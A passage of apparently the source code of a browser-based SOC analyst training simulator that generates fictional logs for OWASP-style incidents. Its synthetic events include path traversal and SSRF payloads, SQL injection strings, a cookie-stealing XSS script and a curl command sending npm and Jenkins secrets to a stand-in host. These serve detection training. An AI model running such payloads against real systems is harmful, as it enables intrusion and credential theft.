<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>SOC Lab — SIEM &amp; SOAR Practice Simulator</title>
<style>
:root{--bg:#0a0f1d;--panel:#111a2d;--panel2:#16213a;--line:#23304d;--text:#e6ebf5;--muted:#8d9ab5;--accent:#4cc2ff;--ok:#3ddc97;--warn:#ffb547;--bad:#ff5d6c;--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--text);font:14px/1.5 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
header{position:sticky;top:0;z-index:5;background:#0a0f1df0;backdrop-filter:blur(6px);border-bottom:1px solid var(--line)}
.top{display:flex;align-items:center;gap:10px;padding:10px 14px;max-width:1100px;margin:0 auto}
.logo{font-weight:800;letter-spacing:.3px;font-size:16px}.logo span{color:var(--accent)}
.status{margin-left:auto;font-size:12px;color:var(--muted);text-align:right}
nav{display:flex;gap:4px;overflow-x:auto;padding:0 10px 8px;max-width:1100px;margin:0 auto;scrollbar-width:none}
nav button{flex:none;background:transparent;border:1px solid transparent;color:var(--muted);padding:7px 12px;border-radius:8px;font:inherit;cursor:pointer}
nav button.on{background:var(--panel2);border-color:var(--line);color:var(--text)}
nav .badge{background:var(--bad);color:#fff;border-radius:9px;padding:0 6px;font-size:11px;margin-left:4px}
main{max-width:1100px;margin:0 auto;padding:14px}
.card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:14px;margin-bottom:12px}
h1{font-size:22px;margin:0 0 6px}h2{font-size:17px;margin:0 0 10px}h3{font-size:14px;margin:12px 0 6px;color:var(--accent)}
p{margin:6px 0}.muted{color:var(--muted)}.small{font-size:12px}
.mono{font-family:var(--mono);font-size:12.5px}
.row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}.grow{flex:1;min-width:180px}
input,select,textarea{background:#0b1324;border:1px solid var(--line);color:var(--text);border-radius:8px;padding:9px 10px;font:inherit;width:100%}
textarea{min-height:70px;resize:vertical}
input:focus,select:focus,textarea:focus{outline:2px solid #4cc2ff55;border-color:var(--accent)}
.btn{background:var(--panel2);border:1px solid var(--line);color:var(--text);padding:8px 14px;border-radius:8px;font:inherit;cursor:pointer;white-space:nowrap}
.btn:hover{border-color:var(--accent)}.btn.pri{background:var(--accent);color:#04121f;border-color:var(--accent);font-weight:600}
.btn.ok{border-color:#3ddc9766;color:var(--ok)}.btn.bad{border-color:#ff5d6c66;color:var(--bad)}.btn.sm{padding:5px 10px;font-size:12px}
.btn.sel.ok{background:#3ddc9722}.btn.sel.bad{background:#ff5d6c22}
.chips{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
.chip{background:#0b1324;border:1px solid var(--line);color:var(--muted);border-radius:20px;padding:4px 10px;font-size:12px;cursor:pointer}
.chip:hover{color:var(--text);border-color:var(--accent)}
.grid{display:grid;gap:12px;grid-template-columns:1fr}.grid>*{min-width:0}.step>div{min-width:0}
@media(max-width:600px){.logo .muted{display:none}}
@media(min-width:820px){.grid.two{grid-template-columns:1fr 1fr}.grid.side{grid-template-columns:240px 1fr}}
.sev{font-size:11px;font-weight:700;text-transform:uppercase;padding:2px 8px;border-radius:5px}
.sev.high{background:#ff5d6c22;color:var(--bad)}.sev.medium{background:#ffb54722;color:var(--warn)}.sev.low{background:#4cc2ff22;color:var(--accent)}
.ev{border-bottom:1px solid var(--line);padding:6px 2px}
.ev summary{cursor:pointer;list-style:none;font-family:var(--mono);font-size:12px;word-break:break-all}
.ev summary::-webkit-details-marker{display:none}
.ev .t{color:var(--muted)}.kv b{color:#9fb3d9;font-weight:500}
.full{margin:6px 0 4px 12px;font-family:var(--mono);font-size:12px;background:#0b1324;border-radius:8px;padding:8px;word-break:break-all}
.st{padding:0 6px;border-radius:4px;font-size:11px;background:#23304d}
.st-auth{background:#3a2a5c}.st-firewall{background:#5c2a2a}.st-proxy{background:#2a4a5c}.st-dns{background:#2a5c45}.st-edr{background:#5c4a2a}.st-email{background:#4a2a5c}
table{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12px}
th,td{text-align:left;padding:6px 8px;border-bottom:1px solid var(--line);word-break:break-all}th{color:var(--muted);font-weight:500}
.hist{display:flex;align-items:flex-end;gap:3px;height:60px;margin:8px 0 2px}
.hist div{flex:1;background:var(--accent);opacity:.75;border-radius:3px 3px 0 0;min-height:1px}
.histl{display:flex;justify-content:space-between;font-size:10px;color:var(--muted);font-family:var(--mono)}
.fields details{margin-bottom:4px}.fields summary{cursor:pointer;font-size:12.5px;color:#9fb3d9}
.fv{display:flex;justify-content:space-between;font-size:12px;font-family:var(--mono);padding:2px 6px;cursor:pointer;border-radius:4px;word-break:break-all}
.fv:hover{background:var(--panel2)}
.term{background:#050913;border:1px solid var(--line);border-radius:10px;padding:10px;font-family:var(--mono);font-size:12px;min-height:80px;max-height:340px;overflow:auto;white-space:pre-wrap}
.term .ok{color:var(--ok)}.term .bad{color:var(--bad)}.term .warn{color:var(--warn)}.term .info{color:var(--accent)}
.step{display:grid;grid-template-columns:28px 1fr;gap:8px;align-items:start;background:var(--panel2);border:1px solid var(--line);border-radius:10px;padding:8px;margin-bottom:8px}
.step .n{width:24px;height:24px;border-radius:50%;background:var(--accent);color:#04121f;font-weight:700;display:grid;place-items:center;font-size:12px}
.step .ctl{display:flex;gap:4px;margin-top:6px}
.mission{display:flex;flex-direction:column;gap:6px}
.tag{display:inline-block;font-size:11px;padding:1px 8px;border-radius:10px;background:#23304d;color:var(--muted)}
.flow{display:flex;gap:6px;flex-wrap:wrap}.flow div{flex:1;min-width:120px;background:var(--panel2);border:1px solid var(--line);border-radius:10px;padding:8px;font-size:12px}
.flow b{display:block;color:var(--accent);font-size:13px}
.res-item{display:flex;gap:8px;padding:6px 0;border-bottom:1px solid var(--line);font-size:13px}
.big{font-size:40px;font-weight:800}
.err{border-color:#ff5d6c66;color:var(--bad)}
.toggle{display:flex;align-items:center;gap:8px;cursor:pointer}
.toggle input{width:auto}
code{font-family:var(--mono);background:#0b1324;padding:1px 5px;border-radius:4px;font-size:12px}
.hint{background:#ffb54714;border:1px solid #ffb54744;border-radius:8px;padding:8px;margin:6px 0;font-size:13px}
</style>
</head>
<body>
<header>
  <div class="top"><div class="logo">SOC<span>Lab</span> <span class="muted small" style="font-weight:400">SIEM · SOAR simulator</span></div><div class="status" id="status">No active mission</div></div>
  <nav id="nav"></nav>
</header>
<main id="view"></main>

<script>
/* ============ utilities ============ */
const $=s=>document.querySelector(s);
const esc=s=>String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
function mulberry32(a){return function(){a|=0;a=a+0x6D2B79F5|0;let t=Math.imul(a^a>>>15,1|a);t=t+Math.imul(t^t>>>7,61|t)^t;return((t^t>>>14)>>>0)/4294967296}}
let R=mulberry32(7);
const rnd=(a,b)=>Math.floor(R()*(b-a+1))+a;
const pick=a=>a[Math.floor(R()*a.length)];
const hex=n=>{let s='';for(let i=0;i<n;i++)s+='0123456789abcdef'[Math.floor(R()*16)];return s};
const BASE=Date.UTC(2026,10,3,9,0,0);
const T=min=>BASE+Math.round(min*60000);
const p2=n=>String(n).padStart(2,'0');
function fmtT(ts){const d=new Date(ts);return `${p2(d.getUTCHours())}:${p2(d.getUTCMinutes())}:${p2(d.getUTCSeconds())}`}
function fmtV(k,v){if(k==='_time')return fmtT(v);if((k==='bytes'||k==='sum')&&typeof v==='number')return v.toLocaleString('en-US');return v}
function ev(min,f,mal){return Object.assign({_time:T(min)},f,{_mal:!!mal})}
const norm=s=>String(s??'').trim().toLowerCase().replace(/^["']|["']$/g,'');
function matchAny(p,vals){p=norm(p);if(!p)return false;return [].concat(vals).some(v=>{if(v==='*')return true;v=norm(v);return p===v||(p.length>=8&&v.includes(p))||(v.length>=6&&p.includes(v))})}
let store={};try{store=JSON.parse(localStorage.getItem('soclab_best')||'{}')}catch(e){}
function saveBest(){try{localStorage.setItem('soclab_best',JSON.stringify(store))}catch(e){}}

/* ============ fictional company ============ */
const PEOPLE={
 alice:{host:'WS-01',ip:'10.0.1.11',dept:'HR',title:'HR Officer'},
 bob:{host:'WS-02',ip:'10.0.1.12',dept:'Finance',title:'Accountant'},
 rahim:{host:'WS-03',ip:'10.0.1.13',dept:'IT',title:'System Administrator'},
 karim:{host:'WS-04',ip:'10.0.1.14',dept:'Sales',title:'Sales Executive'},
 nusrat:{host:'WS-05',ip:'10.0.1.15',dept:'Marketing',title:'Marketing Lead'},
 farhan:{host:'WS-06',ip:'10.0.1.16',dept:'Finance',title:'Payroll Officer'},
 sadia:{host:'WS-07',ip:'10.0.1.17',dept:'Legal',title:'Legal Counsel'},
 tanvir:{host:'WS-08',ip:'10.0.1.18',dept:'Finance',title:'Finance Manager'}};
const SERVICE={svc_backup:'Service account — nightly backups on SRV-WEB01',deploy:'Service account — CI/CD deployments to SRV-WEB01',webadmin:'Shared admin account for SRV-WEB01 (legacy)',svc_nessus:'Service account — IT Security, owner: rahim. Purpose: authorised credentialed vulnerability scanning'};
const ASSETS={'10.0.2.10':'SRV-WEB01 — public-facing web server (DMZ)','10.0.2.20':'SRV-FILE01 — file server (Finance, HR shares)','10.0.2.5':'SRV-DC01 — domain controller','10.0.1.250':'IT-SCAN01 — vulnerability scanner, owner: IT Security'};
Object.entries(PEOPLE).forEach(([u,p])=>ASSETS[p.ip]=`${p.host} — workstation of ${u} (${p.dept})`);
const BENIGN_DOM=['www.google.com','outlook.office365.com','teams.microsoft.com','github.com','www.thedailystar.net','drive.google.com','windowsupdate.com','slack.com','zoom.us','stackoverflow.com','cdn.jsdelivr.net','www.linkedin.com'];
const CAT={'www.google.com':'search','outlook.office365.com':'business','teams.microsoft.com':'business','github.com':'software-dev','www.thedailystar.net':'news','drive.google.com':'cloud-storage','windowsupdate.com':'software-update','slack.com':'business','zoom.us':'business','stackoverflow.com':'software-dev','cdn.jsdelivr.net':'cdn','www.linkedin.com':'social'};
const DOM_IP={};BENIGN_DOM.forEach((d,i)=>DOM_IP[d]=['142.250.183.'+(10+i),'52.96.'+i+'.10','104.18.32.'+(7+i)][i%3]);
const PROCS=['chrome.exe','outlook.exe','teams.exe','excel.exe','winword.exe','svchost.exe','onedrive.exe'];
const PROC_HASH={};PROCS.forEach(p=>PROC_HASH[p]=hex(64));
const MAIL_SENDERS=['hr@company.local','it-ops@company.local','noreply@github.com','newsletter@thedailystar.net','ceo@company.local','calendar@company.local'];
const SUBJ=['Weekly team sync','Updated leave policy','Your pull request was merged','Morning headlines','Q4 targets','Meeting invitation: project review'];

function noise(n){const E=[];const users=Object.keys(PEOPLE);
 for(let i=0;i<n;i++){const m=R()*120,u=pick(users),p=PEOPLE[u],r=R();
  if(r<.2)E.push(ev(m,{sourcetype:'auth',event:pick(['windows_logon','windows_logon','o365_login']),host:'SRV-DC01',user:u,src_ip:p.ip,action:R()<.95?'success':'failure',country:'BD'}));
  else if(r<.45){const d=pick(BENIGN_DOM);E.push(ev(m,{sourcetype:'firewall',host:'FW-EDGE01',src_ip:p.ip,dest_ip:DOM_IP[d],dest_port:pick([443,443,443,80]),direction:'outbound',action:R()<.97?'allowed':'blocked',bytes:rnd(2000,3000000)}))}
  else if(r<.65){const d=pick(BENIGN_DOM);E.push(ev(m,{sourcetype:'proxy',user:u,src_ip:p.ip,domain:d,url:'https://'+d+'/'+pick(['','index','api/v1/sync','search','mail','home']),method:pick(['GET','GET','GET','POST']),category:CAT[d],action:'allowed',bytes:rnd(1000,800000)}))}
  else if(r<.80){const d=pick(BENIGN_DOM);E.push(ev(m,{sourcetype:'dns',host:p.host,src_ip:p.ip,query:d,answer:DOM_IP[d]}))}
  else if(r<.94){const pr=pick(PROCS);E.push(ev(m,{sourcetype:'edr',event:'process_start',host:p.host,user:u,process:pr,parent:'explorer.exe',cmdline:pr,hash:PROC_HASH[pr]}))}
  else E.push(ev(m,{sourcetype:'email',sender:pick(MAIL_SENDERS),recipient:u+'@company.local',subject:pick(SUBJ),verdict:'delivered'}));
 }return E}

/* ============ incident library (OWASP Top 10:2025 + common SOC alerts) ============ */
const UAS=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0','Mozilla/5.0 (iPhone; CPU iPhone OS 18_1) Safari/604.1','Mozilla/5.0 (Linux; Android 14) Chrome/130.0 Mobile','Mozilla/5.0 (Windows NT 10.0; rv:132.0) Firefox/132.0'];
let CUST=[];
const bdIP=()=>[...pick([[103,rnd(100,250)],[37,111],[27,147],[114,130]]),rnd(0,255),rnd(1,254)].join('.');
function buildCustomers(){CUST=['arif','mitu','sumon','rina','jamal','lima','sakib','tania','rafi','nila','imran','ruma'].map((u,i)=>({u:'cust_'+u,ip:bdIP(),ua:pick(UAS),oid:5000+i*13}))}
const WEB=(m,f,mal)=>ev(m,Object.assign({sourcetype:'web',host:'SRV-WEB01',src_ip:'',method:'GET',uri:'/',status:200,user:'-',bytes:rnd(400,30000),user_agent:UAS[0],scheme:'https',response_ms:rnd(20,300)},f),mal);
function webNoise(n){const E=[];for(let i=0;i<n;i++){const m=R()*120,c=pick(CUST),r=R(),b={src_ip:c.ip,user_agent:c.ua};let f;
 if(r<.33)f={uri:'/products?id='+rnd(100,400)};else if(r<.45)f={uri:'/'};else if(r<.55)f={uri:'/static/app.js'};
 else if(r<.66)f={method:'POST',uri:'/login',user:c.u,status:R()<.96?200:401};else if(r<.76)f={uri:'/cart',user:c.u};
 else if(r<.84)f={uri:'/api/orders/'+(c.oid+rnd(0,2)),user:c.u};else if(r<.92)f={uri:'/search?q='+pick(['saree','phone','rice+cooker','shoes','headphones'])};
 else if(r<.96)f={uri:'/favicon.ico',status:404,bytes:0};else f={method:'POST',uri:'/checkout',user:c.u};
 if(R()<.004)f.status=500;E.push(WEB(m,Object.assign(b,f)))}return E}
ASSETS['10.0.2.30']='BUILD01 — CI/CD build server (Jenkins)';

const INC=[
/* ---------------- OWASP Top 10:2025 ---------------- */
{id:'a01_idor',cat:'OWASP',tag:'A01:2025 Broken Access Control',type:'Broken access control — IDOR',name:'Order enumeration (IDOR)',
 desc:'A logged-in user changes the ID in an API URL and reads other customers\' records, because the server checks login but not ownership.',
 gen(c){const a=c.ip(),acct=pick(['cust_hasan99','cust_test01','cust_shadow']),ua='python-requests/2.32.3',m=c.t(),n=rnd(80,140),st=rnd(1000,1100),E=[];
  E.push(WEB(m,{src_ip:a,method:'POST',uri:'/login',user:acct,user_agent:ua},1));
  for(let i=0;i<n;i++)E.push(WEB(m+1+i*.04,{src_ip:a,uri:'/api/orders/'+(st+i),user:acct,user_agent:ua,bytes:rnd(900,2500)},1));
  return{events:E,questions:[{q:'Which customer account was used to enumerate orders?',a:[acct]},{q:'About how many orders were accessed? (number)',num:n,tol:10}],
  required:[['revoke_sessions',acct],['block_ip',a],['create_ticket','*']],recommended:[['enrich_ip',a],['notify','*']],
  intel:{[a]:'SUSPICIOUS — cloud VPS, seen running scrapers against e-commerce APIs.'},
  story:`Account <b>${acct}</b> logged in from ${a} and a script walked /api/orders/${st}…${st+n-1}, downloading ${n} other customers' orders. The API returned 200 for every ID — it checked that you were logged in, not that the order was yours. Fix: server-side ownership checks.`,
  tags:['OWASP A01:2025','CWE-639 Authorization Bypass (IDOR)','T1213 Data from Information Repositories'],
  hints:['sourcetype=web uri=/api/orders/* | stats dc(uri) by user','Normal customers open 1–3 of their own orders. Who opened 100+?']}}},
{id:'a01_trav',cat:'OWASP',tag:'A01:2025 Broken Access Control',type:'Broken access control — path traversal',name:'Path traversal on /download',
 desc:'"../" sequences in a file parameter let an attacker read files outside the web folder, such as /etc/passwd or config files.',
 gen(c){const a=c.ip(),m=c.t(),E=[];const ps=['../etc/passwd','../../etc/passwd','../../../etc/passwd','..%2f..%2f..%2fetc%2fpasswd','../../../../etc/passwd','../../../../etc/shadow','../../../../var/www/shop/.env','../../../../proc/self/environ'];
  ps.forEach((p,i)=>{const ok=p==='../../../../etc/passwd'||p==='../../../../var/www/shop/.env';E.push(WEB(m+i*.3,{src_ip:a,uri:'/download?file='+p,status:ok?200:(p.includes('shadow')?403:404),bytes:ok?rnd(1800,3200):0,user_agent:'curl/8.5.0'},1))});
  return{events:E,questions:[{q:'Which IP performed the traversal?',a:[a]},{q:'Which application secrets file was read successfully?',a:['/var/www/shop/.env','.env']}],
  required:[['block_ip',a],['create_ticket','*']],recommended:[['enrich_ip',a]],
  intel:{[a]:'MALICIOUS — scanning for LFI/path traversal on many sites this week.'},
  story:`${a} fed "../" sequences into <code>/download?file=</code>. Two requests returned 200: <b>/etc/passwd</b> and the shop's <b>.env</b> (database password, API keys). The encoded %2f attempt was not caught by the "../" rule — a good reminder that attackers encode payloads. Fix: canonicalise paths and allow-list files; rotate every secret in .env.`,
  tags:['OWASP A01:2025','CWE-22 Path Traversal','T1083 File and Directory Discovery'],hints:['sourcetype=web uri=*../* | table _time, src_ip, uri, status, bytes','Which requests got status=200?']}}},
{id:'a01_ssrf',cat:'OWASP',tag:'A01:2025 Broken Access Control (SSRF)',type:'SSRF — server-side request forgery',name:'SSRF to cloud metadata',
 desc:'The app fetches any URL a user supplies, so an attacker makes the server request internal addresses like the cloud metadata service to steal credentials.',
 gen(c){const a=c.ip(),m=c.t(),cc=pick(['US','DE','BR']),E=[];
  [['http://example.com/cat.png',200],['http://127.0.0.1:8080/admin',200],['http://169.254.169.254/latest/meta-data/',200],['http://169.254.169.254/latest/meta-data/iam/security-credentials/',200],['http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-web-role',200]].forEach(([u,s],i)=>E.push(WEB(m+i*.5,{src_ip:a,uri:'/api/fetch-image?url='+u,status:s,bytes:rnd(300,1500),user_agent:'Mozilla/5.0 (X11; Linux x86_64) Firefox/131.0'},1)));
  E.push(ev(m+2.1,{sourcetype:'firewall',host:'FW-CORE01',src_ip:'10.0.2.10',dest_ip:'169.254.169.254',dest_port:80,direction:'internal',action:'allowed',bytes:rnd(800,1500)},1));
  E.push(ev(m+rnd(8,14),{sourcetype:'auth',event:'cloud_api_call',host:'CloudTrail',user:'shop-web-role',src_ip:a,action:'success',country:cc,msg:'ListBuckets, GetObject customer-exports/*'},1));
  return{events:E,questions:[{q:'Which IP sent the SSRF payloads?',a:[a]},{q:'Which cloud role\'s credentials were stolen?',a:['shop-web-role']}],
  required:[['block_ip',a],['revoke_sessions','shop-web-role'],['create_ticket','*']],recommended:[['enrich_ip',a]],
  intel:{[a]:`MALICIOUS — VPS (${cc}) linked to cloud credential theft.`},
  story:`${a} abused <code>/api/fetch-image?url=</code> to make SRV-WEB01 call <b>169.254.169.254</b>, the cloud metadata service, and read temporary keys for <b>shop-web-role</b>. Minutes later those keys were used from ${a} (${cc}) to list storage buckets. SSRF is now part of A01 in the 2025 list. Fix: allow-list fetch targets, block metadata IPs, enforce IMDSv2.`,
  tags:['OWASP A01:2025 (SSRF)','CWE-918 SSRF','T1552.005 Cloud Instance Metadata API'],hints:['sourcetype=web uri=*169.254.169.254*','Then look for logins using the stolen role: sourcetype=auth user=shop-web-role']}}},
{id:'a02_misconf',cat:'OWASP',tag:'A02:2025 Security Misconfiguration',type:'Security misconfiguration — exposed files',name:'Exposed .git and .env files',
 desc:'A content-discovery scan finds files that should never be public (.git, .env, backups) because the web server was deployed with unsafe defaults.',
 gen(c){const a=c.ip(),m=c.t(),ua='gobuster/3.6',E=[];const paths=['/admin','/backup.zip','/wp-admin/','/phpinfo.php','/config.php.bak','/.svn/entries','/server-status','/db.sql','/old/','/test/','/api/swagger.json','/.DS_Store','/debug','/console','/actuator/env','/.htpasswd','/dump.sql','/site.tar.gz','/.aws/credentials','/web.config'];
  for(let i=0;i<rnd(45,60);i++)E.push(WEB(m+i*.04,{src_ip:a,uri:i<paths.length?paths[i]:'/dir'+rnd(1,999)+'/',status:404,bytes:0,user_agent:ua},1));
  E.push(WEB(m+2.5,{src_ip:a,uri:'/.git/config',status:200,bytes:rnd(250,400),user_agent:ua},1));E.push(WEB(m+2.6,{src_ip:a,uri:'/.env',status:200,bytes:rnd(600,900),user_agent:ua},1));
  return{events:E,questions:[{q:'Which scanning tool was used? (from user_agent)',a:['gobuster']},{q:'Name one sensitive file that was served with status 200',a:['/.env','/.git/config','.env','.git']}],
  required:[['block_ip',a],['create_ticket','*']],recommended:[['enrich_ip',a],['notify','*']],
  intel:{[a]:'SUSPICIOUS — mass content-discovery scanning.'},
  story:`${a} ran <b>gobuster</b> against the shop. Most paths 404'd, but <b>/.git/config</b> and <b>/.env</b> returned 200 — the deployment copied the repo and secrets into the web root. Fix: deny dotfiles in the web server, deploy build artefacts only, and rotate all secrets that were in .env.`,
  tags:['OWASP A02:2025','CWE-538 Sensitive info in accessible file','T1595.003 Wordlist Scanning'],hints:['sourcetype=web status=404 | stats count by src_ip','Then: sourcetype=web src_ip="<ip>" status=200']}}},
{id:'a03_supply',cat:'OWASP',tag:'A03:2025 Software Supply Chain Failures',type:'Supply chain — malicious package',name:'Typosquatted npm package on build server',
 desc:'A dependency with a look-alike name runs an install script on the build server that steals tokens and secrets.',
 gen(c){const pkg=pick(['expresss-session','colorsjs-utils','reqeusts-http']),dom=pick(['npm-stats-cdn.example','pkg-telemetry.example']),dip=c.ip(),m=c.t(),H='BUILD01',HIP='10.0.2.30',E=[];
  const e=(d,f)=>E.push(ev(m+d,Object.assign({sourcetype:'edr',event:'process_start',host:H,user:'deploy'},f),1));
  e(0,{process:'npm',parent:'jenkins',cmdline:'npm install '+pkg+'@2.1.4',hash:hex(64)});e(.3,{process:'node',parent:'npm',cmdline:'node scripts/postinstall.js',hash:hex(64)});
  e(.4,{process:'curl',parent:'node',cmdline:`curl -s -X POST https://${dom}/collect -d @/home/deploy/.npmrc -d @/var/lib/jenkins/secrets/master.key`,hash:hex(64)});
  E.push(ev(m+.41,{sourcetype:'dns',host:H,src_ip:HIP,query:dom,answer:dip},1));E.push(ev(m+.42,{sourcetype:'firewall',host:'FW-EDGE01',src_ip:HIP,dest_ip:dip,dest_port:443,direction:'outbound',action:'allowed',bytes:rnd(3000,9000)},1));
  return{events:E,questions:[{q:'Which malicious package was installed?',a:[pkg]},{q:'To which domain were secrets sent?',a:[dom]}],
  required:[['isolate_host',[H,HIP]],['block_domain',dom],['create_ticket','*']],recommended:[['reset_password','deploy'],['block_ip',dip]],
  intel:{[dom]:'MALICIOUS — exfil endpoint used by typosquatted npm packages.',[dip]:'MALICIOUS — hosts '+dom},
  story:`A developer added <b>${pkg}</b> (a typo of a popular package). Its postinstall script ran on <b>BUILD01</b> and used curl to POST the npm token and Jenkins master key to <b>${dom}</b>. Fix: remove the package, rotate every CI secret, pin dependencies with a lockfile and use an SBOM / package allow-list.`,
  tags:['OWASP A03:2025','CWE-1357 Reliance on insufficiently trustworthy component','T1195.002 Compromise Software Supply Chain'],hints:['sourcetype=edr host=BUILD01 | table _time, process, parent, cmdline','Why would node start curl during npm install?']}}},
{id:'a04_crypto',cat:'OWASP',tag:'A04:2025 Cryptographic Failures',type:'Cryptographic failure — cleartext credentials',name:'Passwords sent over plain HTTP',
 desc:'A legacy endpoint sends usernames and passwords over unencrypted HTTP (in the URL), so anyone on the network path can steal them.',
 gen(c){const a=c.ip(),m=c.t(),vs=[...CUST].sort(()=>R()-.5),E=[];vs.slice(0,10).forEach((v,i)=>E.push(WEB(m+i*.6,{src_ip:v.ip,uri:`/m/login?user=${v.u}&pass=********`,user:v.u,scheme:'http',user_agent:'ShopApp/1.2 (Android)'},1)));
  const vic=vs.slice(0,3);vic.forEach((v,i)=>E.push(WEB(m+12+i*.5,{src_ip:a,method:'POST',uri:'/login',user:v.u,user_agent:UAS[3]},1)));
  return{events:E,questions:[{q:'Which endpoint leaks credentials in cleartext?',a:['/m/login']},{q:'Which IP logged in to several customer accounts?',a:[a]}],
  required:[['create_ticket','*'],['block_ip',a],['revoke_sessions',vic.map(v=>v.u)]],recommended:[['notify','*']],
  intel:{[a]:'SUSPICIOUS — public Wi-Fi hotspot provider range.'},
  story:`The old Android app (ShopApp 1.2) logs in via <b>http://…/m/login?user=…&pass=…</b> — no TLS, password in the URL. Someone on the same network captured them; ${a} then logged in as ${vic.map(v=>v.u).join(', ')}. Fix: force HTTPS + HSTS, retire the endpoint, never put secrets in URLs, reset affected passwords.`,
  tags:['OWASP A04:2025','CWE-319 Cleartext Transmission','T1040 Network Sniffing'],hints:['sourcetype=web scheme=http | table _time, src_ip, uri, user','Then: sourcetype=web uri=/login status=200 | stats dc(user) by src_ip']}}},
{id:'a05_sqli',cat:'OWASP',tag:'A05:2025 Injection',type:'Injection — SQL injection',name:'SQL injection with sqlmap',
 desc:'User input is concatenated into a SQL query, letting the attacker change the query and dump database tables.',
 gen(c){const a=c.ip(),m=c.t(),ua='sqlmap/1.8.4#stable',E=[];const p=["105'","105'+AND+1=1--+-","105'+AND+1=2--+-","105+AND+SLEEP(5)--+-","105+ORDER+BY+1--+-","105+ORDER+BY+5--+-","105+UNION+ALL+SELECT+NULL--+-","105+UNION+ALL+SELECT+NULL,NULL,NULL--+-","105+UNION+ALL+SELECT+table_name,NULL,NULL+FROM+information_schema.tables--+-","105+UNION+ALL+SELECT+column_name,NULL,NULL+FROM+information_schema.columns+WHERE+table_name='users'--+-","105+UNION+ALL+SELECT+email,password_hash,phone+FROM+users--+-"];
  for(let r=0;r<3;r++)p.forEach((x,i)=>{const last=i===p.length-1;E.push(WEB(m+r*1.5+i*.08,{src_ip:a,uri:'/products?id='+x,status:i===0||i===5?500:200,bytes:last?rnd(380000,520000):rnd(2000,9000),response_ms:x.includes('SLEEP')?5000+rnd(1,80):rnd(30,200),user_agent:ua},1))});
  return{events:E,questions:[{q:'Which IP ran the SQL injection?',a:[a]},{q:'Which database table was dumped?',a:['users']},{q:'Which tool was used?',a:['sqlmap']}],
  required:[['block_ip',a],['create_ticket','*'],['notify','*']],recommended:[['enrich_ip',a]],
  intel:{[a]:'MALICIOUS — automated SQLi scanning (sqlmap) reported by multiple honeypots.'},
  story:`${a} used <b>sqlmap</b> against <code>/products?id=</code>. Boolean and time-based tests (SLEEP → 5 s responses) confirmed injection; UNION queries enumerated information_schema and finally dumped the <b>users</b> table (~450 KB response). That is a data breach → Legal/DPO must be notified. Fix: parameterised queries, least-privilege DB user, WAF.`,
  tags:['OWASP A05:2025','CWE-89 SQL Injection','T1190 Exploit Public-Facing Application'],hints:['sourcetype=web uri=*select* | table _time, src_ip, uri, status, bytes','Look at the response bytes of the last UNION request']}}},
{id:'a05_xss',cat:'OWASP',tag:'A05:2025 Injection',type:'Injection — cross-site scripting (XSS)',name:'Stored XSS in product reviews',
 desc:'Script code saved in a review runs in other customers\' browsers and steals their session cookies.',
 gen(c){const a=c.ip(),m=c.t(),pid=rnd(200,399),dom=pick(['cdn-img-cache.example','stats-collector.example']),E=[];
  E.push(WEB(m,{src_ip:a,method:'POST',uri:`/api/reviews?product=${pid}&text=Great!<script>new Image().src='//${dom}/c?'+document.cookie<\/script>`,status:201,user:'cust_reviewer7',user_agent:UAS[0]},1));
  const vs=[...CUST].sort(()=>R()-.5).slice(0,4);vs.forEach((v,i)=>E.push(WEB(m+3+i*2,{src_ip:v.ip,uri:'/products?id='+pid,user:v.u,user_agent:v.ua},1)));
  const vic=vs[0];E.push(WEB(m+15,{src_ip:a,uri:'/account/addresses',user:vic.u,user_agent:UAS[0]},1));E.push(WEB(m+15.5,{src_ip:a,method:'POST',uri:'/account/change-email',user:vic.u,user_agent:UAS[0]},1));
  return{events:E,questions:[{q:'To which domain are cookies being sent?',a:[dom]},{q:'Which product page holds the payload? (id)',a:[String(pid)]}],
  required:[['create_ticket','*'],['revoke_sessions',vs.map(v=>v.u)],['block_ip',a]],recommended:[['block_domain',dom]],
  intel:{[dom]:'MALICIOUS — cookie-collector domain.',[a]:'SUSPICIOUS — residential proxy network.'},
  story:`${a} posted a review on product ${pid} containing a <b>&lt;script&gt;</b> that sends document.cookie to <b>${dom}</b>. Everyone who viewed the page leaked their session; ${a} then reused <b>${vic.u}</b>'s session to change the account email. Fix: output-encode user content, HttpOnly cookies, CSP; delete the review; revoke sessions of everyone who viewed it.`,
  tags:['OWASP A05:2025','CWE-79 Cross-site Scripting','T1539 Steal Web Session Cookie'],hints:['sourcetype=web uri=*<script* | table _time, src_ip, uri','Who viewed that product afterwards? Did the attacker IP use any of their accounts?']}}},
{id:'a06_design',cat:'OWASP',tag:'A06:2025 Insecure Design',type:'Insecure design — business logic abuse',name:'Unlimited coupon stacking',
 desc:'The checkout was designed without a rule that a coupon can be used once, so a user stacks it until the order is nearly free.',
 gen(c){const a=c.ip(),m=c.t(),acct=pick(['cust_dealhunter','cust_rakib77','cust_bargain']),code=pick(['WELCOME500','FLASH300','NEWUSER250']),n=rnd(20,35),E=[];
  for(let i=0;i<n;i++)E.push(WEB(m+i*.1,{src_ip:a,method:'POST',uri:'/api/cart/apply-coupon?code='+code,user:acct,user_agent:'okhttp/4.12',msg:`discount applied, cart total ${Math.max(0,24000-i*800)} BDT`},1));
  E.push(WEB(m+n*.1+1,{src_ip:a,method:'POST',uri:'/checkout',user:acct,user_agent:'okhttp/4.12',msg:'order placed: 3x laptop, total 0 BDT'},1));
  return{events:E,questions:[{q:'Which account abused the coupon?',a:[acct]},{q:'Which coupon code?',a:[code]}],
  required:[['revoke_sessions',acct],['create_ticket','*']],recommended:[['block_ip',a],['notify','*']],
  intel:{[a]:'No reputation hits — residential IP.'},
